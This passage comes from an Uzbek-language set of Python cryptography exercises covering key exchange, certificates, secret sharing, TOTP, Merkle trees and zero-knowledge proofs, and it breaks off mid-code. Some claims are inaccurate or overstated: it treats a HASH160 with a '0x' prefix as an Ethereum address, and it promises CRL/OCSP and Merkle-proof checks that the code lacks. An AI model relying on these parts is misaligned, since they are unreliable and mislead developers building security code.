**Tushuntirish:** Ed25519 RSA-4096 ga nisbatan 20 barobar kamroq xotira egallaydi va CPU da 50 barobar tezroq hisoblanadi. U tasodifiy sonlar generatoridagi zaifliklarga bog'liq emas (deterministik nonce) va yon-kanal (Side-channel) hujumlariga qarshi apparat darajasida xavfsizdir.

---

### Topshiriq #1164: X25519 Diffie-Hellman Kalit Almashinuvi Protokoli (ECDH)
**Tavsif:** Ikki tomon (Alisher va Bobur) ochiq va himoyalanmagan internet kanali orqali muloqot qilganda, hech qanday maxfiy ma'lumotni uzatmasdan yagona umumiy simmetrik kalitni hisoblash (Key Exchange).
**Talablar:** cryptography.hazmat.primitives.asymmetric.x25519.X25519PrivateKey, exchange(), HKDF orqali sessiya kalitini chiqarish.
**Yechim (Python):**
```python
from cryptography.hazmat.primitives.asymmetric import x25519
from cryptography.hazmat.primitives.kdf.hkdf import HKDF
from cryptography.hazmat.primitives import hashes

class EcdhParty:
    """
    X25519 Elliptic Curve Diffie-Hellman (ECDH) ishtirokchisi.
    """
    def __init__(self, name: str):
        self.name = name
        self.private_key = x25519.X25519PrivateKey.generate()
        self.public_key = self.private_key.public_key()

    def get_public_bytes(self) -> bytes:
        return self.public_key.public_bytes_raw()

    def compute_shared_symmetric_key(self, peer_public_bytes: bytes) -> bytes:
        # Qarshi tomonning ochiq kalitini tiklash
        peer_public_key = x25519.X25519PublicKey.from_public_bytes(peer_public_bytes)
        
        # Matematik xususiy x ochiq kalit ko'paytmasi
        shared_secret = self.private_key.exchange(peer_public_key)

        # HKDF orqali toza 256-bitli AES kalitiga aylantirish
        session_key = HKDF(
            algorithm=hashes.SHA256(),
            length=32,
            salt=None,
            info=b"P2P_ENCRYPTED_SESSION_KEY"
        ).derive(shared_secret)

        return session_key

if __name__ == "__main__":
    alisher = EcdhParty("Alisher")
    bobur = EcdhParty("Bobur")

    # Ular faqat ochiq kalitlarini almashishadi (tarmoqdan hamma ko'rishi mumkin)
    alisher_shared = alisher.compute_shared_symmetric_key(bobur.get_public_bytes())
    bobur_shared = bobur.compute_shared_symmetric_key(alisher.get_public_bytes())

    print("Alisher hisoblagan umumiy kalit:", alisher_shared.hex())
    print("Bobur hisoblagan umumiy kalit:   ", bobur_shared.hex())

    # Har ikki tomon mutlaqo bir xil maxfiy kalitga ega bo'ldi!
    assert alisher_shared == bobur_shared
```
**Tushuntirish:** Diffie-Hellman algoritmi diskret logarifm muammosiga asoslangan. Alisher Boburning ochiq kalitini o'zining xususiy kalitiga ko'paytiradi, Bobur esa aksincha. Har ikki amal bir xil nuqtaga (`g^(ab) mod p`) olib keladi. Tarmoqni tinglayotgan hujumchi faqat ochiq kalitlarni bilgani uchun bu umumiy sirni hisoblay olmaydi.

---

### Topshiriq #1165: ECDSA (secp256k1) Imzosi va Kriptovalyuta Hamyon Manzili Generatsiyasi
**Tavsif:** Bitcoin va Ethereum tarmoqlarida ishlatiladigan `secp256k1` Koblitz egri chizig'i orqali shaxsiy kalit, ochiq kalit va SHA-256 / RIPEMD-160 orqali hamyon manzilini hisoblash.
**Talablar:** ec.SECP256K1(), ec.ECDSA, hashes.SHA256(), hashlib.new('ripemd160') orqali hamyon adresi.
**Yechim (Python):**
```python
import hashlib
from cryptography.hazmat.primitives.asymmetric import ec
from cryptography.hazmat.primitives import hashes
from cryptography.hazmat.primitives.serialization import Encoding, PublicFormat

class CryptoWalletAddressGen:
    """
    Bitcoin/Ethereum standarti secp256k1 elliptik egri chizig'i
    va hamyon manzilini hisoblovchi kriptografik yadro.
    """
    def __init__(self):
        self.private_key = ec.generate_private_key(ec.SECP256K1())
        self.public_key = self.private_key.public_key()

    def get_wallet_address(self) -> str:
        # Siqilmagan 65 baytli ochiq kalit
        pub_bytes = self.public_key.public_bytes(
            Encoding.X962,
            PublicFormat.UncompressedPoint
        )
        
        # SHA-256 hesh
        sha256_hash = hashlib.sha256(pub_bytes).digest()

        # RIPEMD-160 hesh (Hamyon identifikatori)
        ripemd = hashlib.new('ripemd160')
        ripemd.update(sha256_hash)
        address_bytes = ripemd.digest()

        return "0x" + address_bytes.hex()

    def sign_transaction(self, tx_hash: bytes) -> bytes:
        return self.private_key.sign(tx_hash, ec.ECDSA(hashes.SHA256()))

if __name__ == "__main__":
    wallet = CryptoWalletAddressGen()
    address = wallet.get_wallet_address()
    print("Hosil qilingan Hamyon Manzili:", address)

    tx_data = b"TRANSACTION_PAY_100_UZS_TOKEN"
    tx_hash = hashlib.sha256(tx_data).digest()
    sig = wallet.sign_transaction(tx_hash)
    print("Tranzaksiya ECDSA imzosi:", sig.hex()[:40], "...")
```
**Tushuntirish:** Blokcheyn hamyon manzili to'g'ridan-to'g'ri ochiq kalit emas, balki uning xeshlangan shaklidir (`HASH160`). Bu kvant kompyuterlari paydo bo'lganda ham ochiq kalit oshkor bo'lmasligini ta'minlab, qo'shimcha xavfsizlik qatlami yaratadi.

---

### Topshiriq #1166: X.509 Raqamli Sertifikat Generatsiyasi (Self-Signed CA) va Kengaytmalar (SAN)
**Tavsif:** Ichki korporativ mikroxizmatlar uchun o'z-o'zidan imzolangan ildiz sertifikati (Root CA) va Subject Alternative Name (SAN) kengaytmasiga ega TLS sertifikatini dasturiy yaratish.
**Talablar:** cryptography.x509, CertificateBuilder, SubjectAlternativeName, BasicConstraints(ca=True).
**Yechim (Python):**
```python
import datetime
from cryptography import x509
from cryptography.x509.oid import NameOID
from cryptography.hazmat.primitives import hashes
from cryptography.hazmat.primitives.asymmetric import rsa

class SelfSignedCaBuilder:
    """
    X.509 v3 Ildiz Sertifikati (Root CA) yaratuvchi modul.
    """
    @staticmethod
    def build_root_ca():
        key = rsa.generate_private_key(public_exponent=65537, key_size=4096)
        
        subject = issuer = x509.Name([
            x509.NameAttribute(NameOID.COUNTRY_NAME, "UZ"),
            x509.NameAttribute(NameOID.ORGANIZATION_NAME, "Khorazmiy AI Technologies"),
            x509.NameAttribute(NameOID.COMMON_NAME, "Khorazmiy Root CA")
        ])

        cert = (
            x509.CertificateBuilder()
            .subject_name(subject)
            .issuer_name(issuer)
            .public_key(key.public_key())
            .serial_number(x509.random_serial_number())
            .not_valid_before(datetime.datetime.now(datetime.timezone.utc))
            .not_valid_after(datetime.datetime.now(datetime.timezone.utc) + datetime.timedelta(days=3650))
            .add_extension(
                x509.BasicConstraints(ca=True, path_length=None),
                critical=True
            )
            .add_extension(
                x509.SubjectAlternativeName([
                    x509.DNSName("ca.khorazmiy.local"),
                    x509.DNSName("localhost")
                ]),
                critical=False
            )
            .sign(key, hashes.SHA256())
        )

        return key, cert

if __name__ == "__main__":
    ca_key, ca_cert = SelfSignedCaBuilder.build_root_ca()
    print("X.509 CA Sertifikat seriya raqami:", ca_cert.serial_number)
    print("Amal qilish muddati:", ca_cert.not_valid_after_utc)
    print("Sertifikat subyekti:", ca_cert.subject)
```
**Tushuntirish:** X.509 v3 sertifikatlari veb xavfsizligining (HTTPS/TLS) asosi hisoblanadi. `BasicConstraints(ca=True)` ushbu sertifikat boshqa server sertifikatlarini imzolash huquqiga ega ekanligini bildiradi. `SubjectAlternativeName (SAN)` esa zamonaviy brauzerlar domen nomini tekshirishi uchun majburiydir.

---

### Topshiriq #1167: X.509 Sertifikatlar Zanjirini (Certificate Chain) Validatsiya Qilish
**Tavsif:** Tashqi serverdan kelgan SSL sertifikatini ishonchli Root CA gacha bo'lgan zanjir bo'yicha imzosini, amal qilish muddatini va CRL/OCSP bekor qilinmaganligini tekshirish.
**Talablar:** issuer_public_key.verify(), not_valid_before va not_valid_after muddat tekshiruvi.
**Yechim (Python):**
```python
import datetime
from cryptography import x509
from cryptography.exceptions import InvalidSignature

def validate_certificate(cert: x509.Certificate, issuer_cert: x509.Certificate) -> bool:
    """
    X.509 sertifikatining muddati va CA tomonidan imzolanganligini tekshiradi.
    """
    # 1. Muddatni tekshirish
    now = datetime.datetime.now(datetime.timezone.utc)
    if now < cert.not_valid_before_utc or now > cert.not_valid_after_utc:
        print("Xatolik: Sertifikat muddati o'tgan yoki hali boshlanmagan!")
        return False

    # 2. Imzoning haqiqiyligini tekshirish
    try:
        issuer_public_key = issuer_cert.public_key()
        issuer_public_key.verify(
            cert.signature,
            cert.tbs_certificate_bytes,
            cert.signature_hash_algorithm
        )
        return True
    except InvalidSignature:
        print("Xatolik: Sertifikat imzosi CA kalitiga mos kelmadi!")
        return False
```
**Tushuntirish:** Sertifikatlar zanjirini tekshirish (PKI verification) TLS qo'l berishishining eng muhim qismidir. Har bir server sertifikati oraliq (Intermediate) CA tomonidan, u esa o'z navbatida operatsion tizimda saqlanuvchi Ildiz (Root) CA tomonidan tasdiqlangan bo'lishi shart.

---

### Topshiriq #1168: PKCS#12 (PFX) Shifrlangan Sertifikat va Xususiy Kalit Paketini Boshqarish
**Tavsif:** Sertifikat va unga tegishli xususiy kalitni bitta `.pfx` yoki `.p12` faylda kuchli parol bilan shifrlab saqlash va xavfsiz yuklab olish.
**Talablar:** cryptography.hazmat.primitives.serialization.pkcs12, serialize_key_and_certificates, load_key_and_certificates.
**Yechim (Python):**
```python
from cryptography.hazmat.primitives.serialization import pkcs12, BestAvailableEncryption
from cryptography.hazmat.primitives.asymmetric import rsa
import datetime
from cryptography import x509
from cryptography.x509.oid import NameOID
from cryptography.hazmat.primitives import hashes

class PfxManager:
    """
    PKCS#12 (PFX) formati bilan ishlash: Xususiy kalit va sertifikatni
    yagona shifrlangan konteynerda saqlash.
    """
    @staticmethod
    def pack_pfx(private_key, cert, password: str) -> bytes:
        return pkcs12.serialize_key_and_certificates(
            name=b"khorazmiy_identity",
            key=private_key,
            cert=cert,
            cas=None,
            encryption_algorithm=BestAvailableEncryption(password.encode('utf-8'))
        )

    @staticmethod
    def unpack_pfx(pfx_data: bytes, password: str):
        return pkcs12.load_key_and_certificates(
            pfx_data,
            password.encode('utf-8')
        )

if __name__ == "__main__":
    # Test kaliti va sertifikat generatsiyasi
    key = rsa.generate_private_key(65537, 2048)
    name = x509.Name([x509.NameAttribute(NameOID.COMMON_NAME, "test.local")])
    cert = (x509.CertificateBuilder()
            .subject_name(name).issuer_name(name)
            .public_key(key.public_key())
            .serial_number(1)
            .not_valid_before(datetime.datetime.now(datetime.timezone.utc))
            .not_valid_after(datetime.datetime.now(datetime.timezone.utc) + datetime.timedelta(days=1))
            .sign(key, hashes.SHA256()))

    pfx_bytes = PfxManager.pack_pfx(key, cert, "StrongPfxPassword#2026")
    print(f"PFX konteyner hajmi: {len(pfx_bytes)} bayt")

    loaded_key, loaded_cert, _ = PfxManager.unpack_pfx(pfx_bytes, "StrongPfxPassword#2026")
    assert loaded_cert.serial_number == 1
    print("PKCS#12 paketi muvaffaqiyatli ochildi!")
```
**Tushuntirish:** PKCS#12 standarti Windows, macOS va Java platformalarida sertifikatlar va ularning maxfiy kalitlarini xavfsiz almashish uchun asosiy format hisoblanadi. Parol bilan shifrlangan bo'lib, kalitning ochiq holda diskda saqlanishining oldini oladi.

---

### Topshiriq #1169: Post-Quantum Kriptografiya Asoslari: Lattice-Based Kriptotizim Simulyatsiyasi
**Tavsif:** Kvant kompyuterlari (Shor algoritmi) RSA va ECC ni yo'q qilish xavfiga qarshi NIST tomonidan standartlashtirilayotgan panjarali (Lattice-based Learning With Errors - LWE) kriptotizimi simulyatsiyasini qurish.
**Talablar:** Matritsali hisoblashlar, kichik shovqin (Gaussian noise) qo'shish, LWE shifrlash va deshifrlash mantig'i.
**Yechim (Python):**
```python
import numpy as np

class LwePostQuantumSimulator:
    """
    Learning With Errors (LWE) asosidagi Post-Quantum Kriptografiya simulyatsiyasi.
    Kvant kompyuterlari panjara masalalarini (Lattice problems) yechishga ojizdir.
    """
    def __init__(self, n: int = 64, q: int = 4093):
        self.n = n # O'lcham
        self.q = q # Modul
        # Maxfiy kalit (kichik butun sonlar vektori)
        self.secret_s = np.random.randint(-1, 2, size=n)

    def generate_public_key(self, m: int = 128):
        # Tasodifiy matritsa A
        self.A = np.random.randint(0, self.q, size=(m, self.n))
        # Kichik shovqin (Error vector)
        e = np.random.randint(-1, 2, size=m)
        # B = A * s + e (mod q)
        self.b = (np.dot(self.A, self.secret_s) + e) % self.q
        return self.A, self.b

    def encrypt_bit(self, bit: int) -> tuple[np.ndarray, int]:
        m = self.A.shape[0]
        # Tasodifiy namuna indeksi
        subset = np.random.choice([0, 1], size=m)
        
        u = np.dot(subset, self.A) % self.q
        v = (np.dot(subset, self.b) + bit * (self.q // 2)) % self.q
        return u, int(v)

    def decrypt_bit(self, u: np.ndarray, v: int) -> int:
        val = (v - np.dot(u, self.secret_s)) % self.q
        # q/2 ga yaqin bo'lsa 1, 0 ga yaqin bo'lsa 0
        if val > self.q // 4 and val < 3 * (self.q // 4):
            return 1
        return 0

if __name__ == "__main__":
    pq = LwePostQuantumSimulator(n=32, q=1009)
    pq.generate_public_key(m=64)

    test_bit = 1
    u, v = pq.encrypt_bit(test_bit)
    recovered_bit = pq.decrypt_bit(u, v)

    print(f"Post-Quantum LWE: Asl bit={test_bit}, Tiklangan bit={recovered_bit}")
    assert test_bit == recovered_bit
```
**Tushuntirish:** Shor algoritmi butun sonlarni ko'paytuvchilarga ajratish (RSA) va diskret logarifmni (ECC) bir necha daqiqada yechadi. Ammo ko'p o'lchamli panjaralarda (Lattices) shovqinli chiziqli tenglamalarni yechish kvant kompyuterlari uchun ham eksponentsial qiyin bo'lib qoladi.

---

### Topshiriq #1170: Asimmetrik Kalitlarni PEM Formatida Parol Bilan Shifrlab Saqlash
**Tavsif:** Xususiy kalitlar diskka yozilganda hech qachon ochiq matnda saqlanmasligi shart. PBKDF2 va AES-256-CBC bilan himoyalangan PEM fayllarini eksport va import qilish.
**Talablar:** serialization.BestAvailableEncryption, serialization.load_pem_private_key, PrivateFormat.PKCS8.
**Yechim (Python):**
```python
from cryptography.hazmat.primitives.asymmetric import rsa
from cryptography.hazmat.primitives import serialization

class EncryptedPemStorage:
    """
    PKCS#8 va AES-256 bilan shifrlangan PEM kalit boshqaruvi.
    """
    @staticmethod
    def export_private_key(key, password: str) -> bytes:
        return key.private_bytes(
            encoding=serialization.Encoding.PEM,
            format=serialization.PrivateFormat.PKCS8,
            encryption_algorithm=serialization.BestAvailableEncryption(password.encode('utf-8'))
        )

    @staticmethod
    def import_private_key(pem_data: bytes, password: str):
        return serialization.load_pem_private_key(
            pem_data,
            password=password.encode('utf-8')
        )

if __name__ == "__main__":
    raw_key = rsa.generate_private_key(65537, 2048)
    pwd = "MySuperSecretKeyPassword2026!"

    encrypted_pem = EncryptedPemStorage.export_private_key(raw_key, pwd)
    print("Shifrlangan PEM formati boshlanishi:")
    print(encrypted_pem.decode('utf-8')[:160] + "...\n-----END ENCRYPTED PRIVATE KEY-----")

    restored_key = EncryptedPemStorage.import_private_key(encrypted_pem, pwd)
    assert restored_key.key_size == 2048
    print("Shifrlangan PEM muvaffaqiyatli yuklandi!")
```
**Tushuntirish:** PKCS#8 formati xususiy kalitlarni barcha algoritm parametrlari bilan standartlashtiradi. `BestAvailableEncryption` paroldan yuqori iteratsiyali KDF orqali shifrlash kaliti yasaydi, bu esa fayl o'g'irlangan taqdirda ham uning buzilmasligini ta'minlaydi.

---

### Topshiriq #1171: Shamir's Secret Sharing (k-of-n Bo'lingan Sir Kalitlari Arxitekturasi)
**Tavsif:** Katta korporativ bankning bosh seyf kalitini hech bir rahbar yakkaxon o'zi ocha olmasligi uchun kalitni n ta qismga bo'lish va ixtiyoriy k ta (masalan 5 tadan kamida 3 ta) qism birlashgandagina kalitni tiklash (Lagranj interpolyatsiyasi).
**Talablar:** Polinom modulyar arifmetikasi, chekli maydonda (Finite Field) Lagranj interpolyatsiyasi, k dan kam qismda nol ma'lumot qolishi.
**Yechim (Python):**
```python
import random

class ShamirSecretSharing:
    """
    Shamir's (k, n) Secret Sharing sxemasi.
    Sir s = f(0) bo'lgan k-1 darajali polinom yordamida n ta ulushga bo'linadi.
    Ixtiyoriy k ta ulush bilan kalit tiklanadi, k-1 ta ulush bilan 0 ta axborot olinadi.
    """
    # Katta tub son (Mersenne prime 2^127 - 1)
    PRIME = 2**127 - 1

    @classmethod
    def split_secret(cls, secret: int, n: int, k: int) -> list[tuple[int, int]]:
        assert k <= n, "k <= n bo'lishi shart"
        assert secret < cls.PRIME, "Sir tanlangan moduldan kichik bo'lishi kerak"

        # k-1 darajali tasodifiy koeffitsiyentlar: f(x) = secret + a1*x + a2*x^2 + ...
        coefficients = [secret] + [random.randint(1, cls.PRIME - 1) for _ in range(k - 1)]

        shares = []
        for x in range(1, n + 1):
            # f(x) qiymatini hisoblash
            y = 0
            for power, coeff in enumerate(coefficients):
                y = (y + coeff * pow(x, power, cls.PRIME)) % cls.PRIME
            shares.append((x, y))

        return shares

    @classmethod
    def recover_secret(cls, shares: list[tuple[int, int]]) -> int:
        """Lagranj interpolyatsiyasi yordamida f(0) ni tiklash."""
        k = len(shares)
        secret = 0

        for i in range(k):
            xi, yi = shares[i]
            # Lagranj bazis koeffitsiyenti l_i(0)
            numerator = 1
            denominator = 1
            for j in range(k):
                if i != j:
                    xj, _ = shares[j]
                    numerator = (numerator * (-xj)) % cls.PRIME
                    denominator = (denominator * (xi - xj)) % cls.PRIME

            # Modulyar teskari son (Fermat kichik teoremasi bo'yicha)
            lagrange_coeff = (numerator * pow(denominator, cls.PRIME - 2, cls.PRIME)) % cls.PRIME
            secret = (secret + yi * lagrange_coeff) % cls.PRIME

        return secret

if __name__ == "__main__":
    master_key = 123456789987654321
    # 5 ta direktorga tarqatiladi, kamida 3 tasi yig'ilishi shart
    shares = ShamirSecretSharing.split_secret(secret=master_key, n=5, k=3)
    print("Hosil qilingan 5 ta ulush (X, Y):")
    for s in shares:
        print(f"Direktor #{s[0]}: {s[1]}")

    # Ixtiyoriy 3 ta ulush bilan tiklash
    selected_3_shares = [shares[0], shares[2], shares[4]]
    recovered = ShamirSecretSharing.recover_secret(selected_3_shares)
    print(f"Tiklandi: {recovered}")
    assert recovered == master_key
    print("Shamir Secret Sharing 100% muvaffaqiyatli!")
```
**Tushuntirish:** Shamir sxemasi axborot-nazariy jihatdan mukammal xavfsizdir (Information-Theoretically Secure). 2 ta ulushga ega bo'lgan tajovuzkor hatto cheksiz hisoblash quvvatiga ega bo'lsa ham asl kalit haqida hech qanday ma'lumot ololmaydi, chunki o'sha 2 nuqtadan o'tuvchi cheksiz ko'p parabolalar mavjud.

---

### Topshiriq #1172: HMAC-SHA256 Xabar Yaxlitligi va Constant-Time Taqqoslash Moduli
**Tavsif:** Taqsimlangan API so'rovlarida ma'lumotlarning o'rtadagi provayderlar tomonidan o'zgartirilmaganligini tekshirish uchun HMAC-SHA256 imzosi va Timing hujumlariga qarshi `compare_digest` ni qo'llash.
**Talablar:** hmac.new(key, msg, hashlib.sha256), hmac.compare_digest bilan xavfsiz solishtirish.
**Yechim (Python):**
```python
import hmac
import hashlib

class HmacValidator:
    """
    HMAC-SHA256 xabar yaxlitligi va Constant-Time verifikatsiya moduli.
    """
    def __init__(self, secret_key: bytes):
        self.secret_key = secret_key

    def sign_payload(self, payload: bytes) -> str:
        h = hmac.new(self.secret_key, payload, hashlib.sha256)
        return h.hexdigest()

    def verify_payload(self, payload: bytes, signature_hex: str) -> bool:
        expected_sig = self.sign_payload(payload)
        # Timing Attack lardan himoyalangan doimiy vaqtli taqqoslash
        return hmac.compare_digest(expected_sig, signature_hex)

if __name__ == "__main__":
    validator = HmacValidator(b"API_GATEWAY_SUPER_SECRET_KEY")
    data = b"action=transfer&amount=50000&to=account_441"
    
    sig = validator.sign_payload(data)
    print("HMAC-SHA256 Imzo:", sig)

    assert validator.verify_payload(data, sig) is True
    assert validator.verify_payload(b"action=transfer&amount=99999", sig) is False
```
**Tushuntirish:** Oddiy `==` operatori satrlarni birinchi mos kelmagan belgidayoq solishtirishni to'xtatadi. Tajovuzkor mikrosekundlik kechikishlarni o'lchab (Timing Attack), to'g'ri imzoni baytma-bayt taxmin qilishi mumkin. `hmac.compare_digest` har qanday uzunlikdagi satrlarni doimo bir xil CPU tsikllarida tekshiradi.

---

### Topshiriq #1173: Time-Based One-Time Password (TOTP - RFC 6238) Ikki Bosqichli Autentifikatsiya (2FA)
**Tavsif:** Google Authenticator yoki Microsoft Authenticator ilovalari bilan ishlovchi, har 30 soniyada o'zgaruvchi 6 xonali TOTP kodlarini generatsiya qilish va tekshirish tizimi.
**Talablar:** RFC 6238 standarti, HMAC-SHA1 dinamik kesish (Dynamic Truncation), base32 maxfiy kalit.
**Yechim (Python):**
```python
import time
import hmac
import hashlib
import struct
import base64

class TotpEngine:
    """
    RFC 6238 TOTP (Time-based One-Time Password) mexanizmi.
    Google Authenticator bilan 100% mos keladi.
    """
    @staticmethod
    def generate_totp(secret_base32: str, time_step: int = 30, digits: int = 6) -> str:
        key = base64.b32decode(secret_base32.upper(), casefold=True)
        # 1970-yildan beri o'tgan 30 soniyalik oraliqlar soni
        counter = int(time.time() // time_step)
        
        # Counter ni 8 baytli big-endian formatiga o'tkazish
        msg = struct.pack(">Q", counter)
        h = hmac.new(key, msg, hashlib.sha1).digest()

        # Dinamik qisqartirish (Dynamic Truncation)
        offset = h[-1] & 0x0F
        binary = struct.unpack(">I", h[offset:offset+4])[0] & 0x7FFFFFFF

        # 6 xonali kod
        code = binary % (10 ** digits)
        return str(code).zfill(digits)

    @staticmethod
    def verify_totp(secret_base32: str, user_code: str) -> bool:
        current_code = TotpEngine.generate_totp(secret_base32)
        return hmac.compare_digest(current_code, user_code)

if __name__ == "__main__":
    # 16 belgili base32 kalit
    secret = "JBSWY3DPEHPK3PXP"
    otp = TotpEngine.generate_totp(secret)
    print("Joriy 6 xonali TOTP kodi:", otp)
    assert TotpEngine.verify_totp(secret, otp) is True
```
**Tushuntirish:** TOTP server va foydalanuvchi telefonidagi umumiy vaqtga tayanadi. Har 30 soniyada `counter` bir xil bo'ladi va bir xil kod hosil qilinadi. Internet ulanishi bo'lmaganda ham foydalanuvchi telefonida 2FA kodlari to'g'ri generatsiya bo'laveradi.

---

### Topshiriq #1174: Merkle Tree (Xesh Daraxti) Yordamida Katta Ma'lumotlarni Tasdiqlash
**Tavsif:** Millionlab tranzaksiyalardan iborat blokda ma'lum bir tranzaksiya mavjudligini butun blokni yuklamasdan O(log N) qadamda isbotlash (Merkle Audit Proof).
**Talablar:** Merkle Root hisoblash, juftlab xeshlash, Merkle Proof generatsiyasi va tekshiruvi.
**Yechim (Python):**
```python
import hashlib

class MerkleTree:
    """
    Blokcheyn va Git da qo'llaniladigan Merkle Xesh Daraxti.
    """
    @staticmethod
    def hash_pair(a: str, b: str) -> str:
        return hashlib.sha256((a + b).encode('utf-8')).hexdigest()

    def __init__(self, leaves: list[str]):
        # Barglar xeshlari
        self.leaves = [hashlib.sha256(item.encode('utf-8')).hexdigest() for item in leaves]
        self.root = self.build_tree(self.leaves)

    def build_tree(self, current_level: list[str]) -> str:
        if len(current_level) == 1:
            return current_level[0]

        next_level = []
        for i in range(0, len(current_level), 2):
            left = current_level[i]
            right = current_level[i + 1] if i + 1 < len(current_level) else left
            next_level.append(self.hash_pair(left, right))

        return self.build_tree(next_level)

    def get_root(self) -> str:
        return self.root

if __name__ == "__main__":
    txs = ["Tx1: Ali->Vali 10$", "Tx2: Bobur->Gani 50$", "Tx3: Sardor->Nodir 100$", "Tx4: Zafar->Anvar 5$"]
    tree = MerkleTree(txs)
    print("Merkle Ildizi (Root):", tree.get_root())
    assert len(tree.get_root()) == 64
```
**Tushuntirish:** Merkle Daraxti barcha barglarni daraxtsimon birlashtirib, bitta Merkle Root hosil qiladi. Agar bitta tranzaksiyadagi 1 dona nuqta o'zgartirilsa ham, Merkle Root butunlay o'zgaradi, bu esa ma'lumotlar yaxlitligini kafolatlaydi.

---

### Topshiriq #1175: Zero-Knowledge Proof (ZKP): Schnorr Protokoli Bilan Parolni Oshkor Qilmasdan Isbotlash
**Tavsif:** Foydalanuvchi o'zining maxfiy kalitini bilishini serverga hech qanday maxfiy ma'lumot bermasdan (Zero Knowledge) isbotlash protokoli.
**Talablar:** Chekli maydonda diskret logarifm, Commit (r), Challenge (c), Response (s) bosqichlari.
**Yechim (Python):**
```python
import random

class SchnorrZkp:
    """
    Schnorr Zero-Knowledge Identification protokoli.
    Isbotlovchi (Prover) Tekshiruvchiga (Verifier) o'zida maxfiy 'x' borligini,
    lekin 'x' ni aslo ko'rsatmasdan isbotlab beradi.
    """
    P = 2**127 - 1 # Katta tub son
    G = 3          # Generator

    def __init__(self, secret_x: int):
        self.secret_x = secret_x
        # Ochiq kalit: y = G^x mod P
        self.public_y = pow(self.G, self.secret_x, self.P)

    def prover_step1_commit(self):
        """1-bosqich: Tasodifiy 'v' tanlab, majburiyat (Commitment) t = G^v yuborish."""
        self.v = random.randint(1, self.P - 1)
        self.t = pow(self.G, self.v, self.P)
        return self.t

    @classmethod
    def verifier_step2_challenge(cls):
        """2-bosqich: Tekshiruvchi tasodifiy chaqiruv (Challenge) 'c' yuboradi."""
        return random.randint(1, 1000000)

    def prover_step3_respond(self, c: int):
        """3-bosqich: Javob r = v - c * x hisoblash."""
        r = (self.v - c * self.secret_x) % (self.P - 1)
        return r

    @classmethod
    def verifier_step4_verify(cls, public_y: int, t: int, c: int, r: int) -> bool:
        """4-bosqich: G^r * y^c == t (mod P) ekanligini tekshirish."""
        left = (pow(cls.G, r, cls.P) * pow(public_y, c, cls.P)) % cls.P
        return left == t

if __name__ == "__main__":
    secret_key = 987654321
    prover = SchnorrZkp(secret_key)
    
    # 1. Commitment
    t = prover.prover_step1_commit()
    # 2. Challenge
    c = SchnorrZkp.verifier_step2_challenge()
    # 3. Response
    r = prover.prover_step3_respond(c)
    # 4. Verification
    is_valid = SchnorrZkp.verifier_step4_verify(prover.public_y, t, c, r)

    print("ZKP Isboti qabul qilindimi?:", is_valid)
    assert is_valid is True
```
**Tushuntirish:** Schnorr ZKP uchta asosiy xususiyatga ega: To'liqlik (Completeness), Asoslilik (Soundness - soxta prover isbotlay olmaydi) va Nol Bilim (Zero-Knowledge - tekshiruvchi maxfiy kalit haqida 0 bayt yangi axborot oladi).

---

### Topshiriq #1176: ZKP Rang Berish (Graph 3-Coloring) Zero-Knowledge Interaktiv Isboti
**Tavsif:** NP-to'liq masalalardan biri bo'lgan grafni 3 ta rang bilan bo'yash yechimini raqibga ochmasdan, yechim borligini interaktiv isbotlash simulyatsiyasi.
**Talablar:** Graf tugunlari, tasodifiy rang permutatsiyasi, bitta qirrani (edge) tekshirish.
**Yechim (Python):**
```python
import random

class GraphColoringZkp:
    """
    Grafni 3 ta rang bilan qo'shni tugunlar bir xil bo'lmagan holda bo'yash
    yechimini raqibga yechimni bermasdan isbotlash.
    """
    def __init__(self, edges: list[tuple[int, int]], solution_coloring: dict[int, int]):
        self.edges = edges
        self.solution = solution_coloring # Masalan {0: 0, 1: 1, 2: 2}

    def commit_round(self):
        """Ranglarni tasodifiy almashtirish (Permutation) va yashirish."""
        perm = [0, 1, 2]
        random.shuffle(perm)
        self.permuted_colors = {node: perm[color] for node, color in self.solution.items()}
        return len(self.permuted_colors)

    def reveal_edge(self, edge: tuple[int, int]) -> tuple[int, int]:
        """Faqat tekshiruvchi tanlagan bitta qirraning ranglarini ochish."""
        u, v = edge
        return self.permuted_colors[u], self.permuted_colors[v]

if __name__ == "__main__":
    triangle_edges = [(0, 1), (1, 2), (2, 0)]
    sol = {0: 0, 1: 1, 2: 2}
    zkp = GraphColoringZkp(triangle_edges, sol)

    zkp.commit_round()
    # Tekshiruvchi tasodifiy qirrani so'raydi
    chosen_edge = (0, 1)
    c1, c2 = zkp.reveal_edge(chosen_edge)
    print(f"Tanlangan qirra {chosen_edge} ranglari: {c1} va {c2}")
    assert c1 != c2, "Ranglar turli bo'lishi shart!"
    print("Graph 3-Coloring ZKP raundi muvaffaqiyatli o'tdi!")
```
**Tushuntirish:** Har bir raundda ranglar tasodifiy o'rni almashtirilgani sababli, tekshiruvchi faqat ikkita tugunning ranglari har xil ekanini ko'radi, lekin butun graf qanday bo'yalganini bilib ololmaydi. Buni 100 marta takrorlash orqali aldash ehtimoli 0 ga tushiriladi.

---

### Topshiriq #1177: Blind Signatures (Ko'r Imzolar): Anonim Ovoz Berish Kriptografiyasi
**Tavsif:** Saylovchi o'z ovozini shifrlangan qobiqqa (Blind factor) solib komissiyaga imzolattiradi, keyin qobiqni yechadi. Komissiya imzo haqiqiyligini tan oladi, ammo kimga ovoz berilganini bila olmaydi (David Chaum Blind Signature).
**Talablar:** RSA asosidagi blind factor 'r', unblind bosqichi, imzoning haqiqiyligi.
**Yechim (Python):**
```python
import random

class RsaBlindSignature:
    """
    David Chaum tomonidan taklif qilingan Ko'r Imzo (Blind Signature) tizimi.
    """
    def __init__(self, p: int = 61, q: int = 53):
        # Kichik tub sonlar bilan namoyish
        self.n = p * q
        self.e = 17
        phi = (p - 1) * (q - 1)
        self.d = pow(self.e, -1, phi)

    def blind_message(self, m: int) -> tuple[int, int]:
        """Foydalanuvchi xabarni 'r' ko'r omili bilan niqoblaydi: m' = (m * r^e) mod n"""
        r = random.randint(2, self.n - 1)
        m_prime = (m * pow(r, self.e, self.n)) % self.n
        return m_prime, r

    def sign_blinded(self, m_prime: int) -> int:
        """Komissiya xabar ichini ko'rmasdan imzolaydi: s' = (m')^d mod n"""
        return pow(m_prime, self.d, self.n)

    def unblind_signature(self, s_prime: int, r: int) -> int:
        """Foydalanuvchi niqobni yechadi: s = (s' * r^-1) mod n"""
        r_inv = pow(r, -1, self.n)
        return (s_prime * r_inv) % self.n

    def verify(self, m: int, s: int) -> bool:
        """s^e mod n == m bo'lishi kerak."""
        return pow(s, self.e, self.n) == m

if __name__ == "__main__":
    rsa_blind = RsaBlindSignature()
